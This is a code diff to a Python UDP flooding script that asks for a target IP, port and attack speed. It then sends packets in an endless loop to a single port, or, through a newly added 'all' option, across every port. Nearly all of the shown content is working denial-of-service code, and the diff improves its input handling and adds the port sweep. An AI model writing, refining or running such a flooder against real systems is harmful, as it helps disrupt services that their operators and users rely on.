@@ -42,8 +42,8 @@ ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
 print(ip)
 print()
 ip = input("\033[94m IP Target \033[1;31;40m  ==> : \033[0m")
-port = input(" \033[94m Port Target \033[1;31;40m ==> : \033[0m")
-speed = input("\033[94m╠═══\033[91m[ Attack speed (0-1000) ] •\n\033[94m╠══>\033[0m ")
+port = str(input(" \033[94m Port Target \033[1;31;40m ==> : \033[0m"))
+speed = int(input("\033[94m╠═══\033[91m[ Attack speed (0-1000) ] •\n\033[94m╠══>\033[0m "))
 print("\033[93m")
 os.system("clear")
 os.system("figlet Attack")
@@ -65,19 +65,21 @@ print( "[====================] 100%")
 time.sleep(3)
 os.system("clear")
 sent = 0
-if port == 00000:
-     port = 1     
+if port == "all":
+     port = 1
+     sent = 1     
      while True:
           sock.sendto(bytes, (ip,port))
-          sent = sent + 1
           port = port + 1
-          print ("Has sent %s packet %s port %d"%(sent,ip,port))
+          print ("Has sent %s data packet %s port %d"%(sent,ip,port))
           time.sleep((1000-speed)/2000)
           if port == 65535:
                port = 1
+               sent = sent + 1
 else:
+     port = int(port)
      while True:
           sock.sendto(bytes, (ip,port))
           sent = sent + 1
-          print ("Has sent %s packet %s port %d"%(sent,ip,port))
+          print ("Has sent %s data packet %s port %d"%(sent,ip,port))
           time.sleep((1000-speed)/2000)
